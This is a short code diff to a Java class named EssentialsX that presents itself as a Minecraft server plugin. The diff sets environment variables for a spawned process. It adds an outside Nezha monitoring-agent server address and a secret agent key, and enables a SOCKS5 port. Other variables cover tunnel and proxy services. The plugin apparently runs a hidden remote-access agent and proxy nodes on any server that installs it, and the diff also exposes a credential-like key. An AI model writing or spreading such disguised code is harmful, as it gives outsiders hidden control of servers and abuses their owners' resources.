@@ -73,15 +73,15 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "b997251f-ec01-4a06-933c-253351ccd2e9");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_SERVER", "nezha.aaccc.nyc.mn:443");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_KEY", "tajok4LCyzdlZbH6EHZGMjI9sG076wR6");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
+        env.put("S5_PORT", "25515");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
@@ -93,7 +93,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
         env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
